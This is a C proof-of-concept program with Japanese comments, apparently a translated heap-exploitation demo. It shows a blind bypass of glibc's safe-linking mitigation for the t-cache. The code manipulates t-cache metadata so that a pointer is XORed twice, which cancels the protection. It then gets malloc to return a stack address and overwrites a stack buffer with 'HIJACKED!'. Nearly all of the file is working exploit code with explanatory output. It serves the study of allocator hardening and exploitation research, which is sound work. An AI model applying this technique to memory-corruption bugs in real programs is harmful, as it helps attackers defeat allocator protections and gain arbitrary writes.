#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>

/* 
 * この手法は、glibc 2.32 で導入された safe-linking 緩和策の blind bypass(ブラインドな回避)を示します。
 * https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=a1a486d70ebcc47a686ff5846875eacad0940e41
 * 
 * 注意: プリミティブが書き込みプリミティブの場合、LSB に 4 ビットのランダム性が含まれるため、
 * 4 ビットのブルートフォース(bruteforce)が必要です。整数をインクリメントできる場合は、ブルートフォースは不要です。
 *
 * Safe-Linking は、ASLR のランダム性を利用して単方向リストを強化するメモリ保護策です。
 * t-cache でのポインタの乗っ取りを防ぐために、ポインタを難読化し、アラインメントのチェックを強制します。
 *
 * エントリが t-cache にリンクされるとき、そのアドレスは、free が呼び出されたアドレスを
 * 12 ビット右にシフトした値と XOR されます。しかし、この新たに保護されたポインタを再びリンクすると、
 * 同じ鍵で再度 XOR されるため、実質的に保護が元に戻ります。
 * したがって、ポインタを 2 回保護するだけで、実質的に次のことが達成されます:
 *	
 *                                  (ptr^key)^key = ptr
 *
 * この技法は t-cache のメタデータの制御を必要とするため、
 * house of water などの技法と組み合わせるのが好ましいかもしれません。
 *
 * 技法の作者: @udp_ctf - Water Paddler / Blue Water
 */

int main(void) {
	// _IO_FILE がヒープ内でバッファリングしないようにします
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);
	setbuf(stderr, NULL);

	// 目標となるスタックバッファを作成します
	char goal[] = "Replace me!";
	puts("============================================================");
	printf("目標は、%p にあるスタック変数に書き込むことです\n", goal);
	printf("文字列の内容: %s\n", goal);
	puts("============================================================");
	puts("\n");

	// tcache_perthread_struct の確保を強制します
	free(malloc(0x60));

	// ステップ 1: 確保
	puts("2 つの異なる t-cache に 2 つのチャンクを確保します:");
	
	// 0x30 の t-cache 用に、サイズ 0x28 のチャンクを 2 つ確保します
	puts("\t- 0x30 のチャンク:");
	void *a = malloc(0x28);
	void *b = malloc(0x28);
	printf("\t\t* エントリ a @ %p\n", a);
	printf("\t\t* エントリ b @ %p\n", b);

	// 0x20 の t-cache 用に、サイズ 0x18 のチャンクを 2 つ確保します
	void *c = malloc(0x18);
	void *d = malloc(0x18);
	puts("\t- 0x20 のチャンク:");
	printf("\t\t* エントリ c @ %p\n", c);
	printf("\t\t* エントリ d @ %p\n", d);
	puts("");

	// ステップ 2: 任意の値を書き込みます(または既存の値へのオフセットを控えます)
	puts("スタック変数へのポインタを格納するポインタを確保します:");

	// チャンクを確保し、'goal' 配列への加工したポインタを格納します。
	void *value = malloc(0x28);
	// ヒープのアラインメントを正しくするため、ポインタが 0 で終わるようにします。そうしないとフォルトが発生します
	*(long *)value = ((long)(goal) & ~(0xf));

	printf("\t* 任意の値 (0x%lx) を %p に書き込みました\n", *(long*)value, value);
	puts("");

	// ステップ 3: 2 つの t-cache の 2 つのチャンクを解放して、2 つの異なるキャッシュに 2 つの t-cache エントリを作ります
	puts("0x30 と 0x20 のチャンクを解放して、t-cache を埋めます");

	puts("\t- 0x30 のチャンクを解放:");
	// 確保した 0x28 のチャンクを解放して、0x30 の t-cache を埋めます
	free(a);
	free(b);
	printf("\t\t> 0x30 の t-cache: [%p -> %p]\n", b, a);

	puts("\t- 0x20 のチャンクを解放");
	// 確保した 0x18 のチャンクを解放して、0x20 の t-cache を埋めます
	free(c);
	free(d);
	printf("\t\t> 0x20 の t-cache: [%p -> %p]\n", d, c);
	puts("");

	// ステップ 4: t-cache のメタデータを制御するプリミティブを使って、脆弱性を実行します
	puts("0x30 の t-cache ポインタを、任意の値を保持するヒープ上の値を指すように変更します。");
	puts("t-cache のメタデータ内の 0x30 用ポインタの LSB を上書きします:");
	
	// t-cache のメタデータのアドレスを計算します
	void *metadata = (void *)((long)(value) & ~(0xfff)) + 0x70;

	// 0x30 の t-cache チャンクの LSB を上書きして、任意の値を含むヒープチャンクを指すようにします
	*(unsigned int*)(metadata+0xb0) = (((long)metadata >> 12) << 12)+((long)(value) & (0xfff));

	printf("\t\t> 0x40 の t-cache: [%p -> 0x%lx]\n", value, (*(long*)value)^((long)metadata>>12));
	puts("");

	puts("1 回確保して、保護されたポインタを 0x40 の bin の現在のエントリにします:");
	void *_ = malloc(0x28);
	printf("\t\t> 0x30 の t-cache: [0x%lx]\n", *(unsigned long*)(metadata+0xb0));
	puts("");

	/* VULNERABILITY */	
	puts("t-cache のメタデータ内で、0x20 の bin を、新たに safe-link された値を含む 0x40 の bin に向けます:");
	*(unsigned int*)(metadata+0xa8) = (long)(metadata)+0xb0;
	printf("\t\t> 0x20 の t-cache: [0x%lx -> 0x%lx]\n", (long)(metadata)+0xb0, *(long*)value);
	puts("");
	/* VULNERABILITY */	

	// ステップ 5: 2 回確保して、任意の値を確保します
	puts("2 回確保して、任意の値へのポインタを得ます");
	
	_ = malloc(0x18);
	printf("\t\t> 1 回目の 0x20 の確保: %p\n", _);
	
	char *vuln = malloc(0x18);
	printf("\t\t> 2 回目の 0x20 の確保: %p\n", vuln);
	puts("");

	// ステップ 6: 目標の文字列ポインタを上書きし、変更されたことを確認します
	strcpy(vuln, "XXXXXXXXXXX HIJACKED!");

	printf("文字列の現在の内容: %s\n", goal);	
	assert(strcmp(goal, "Replace me!") != 0);
}
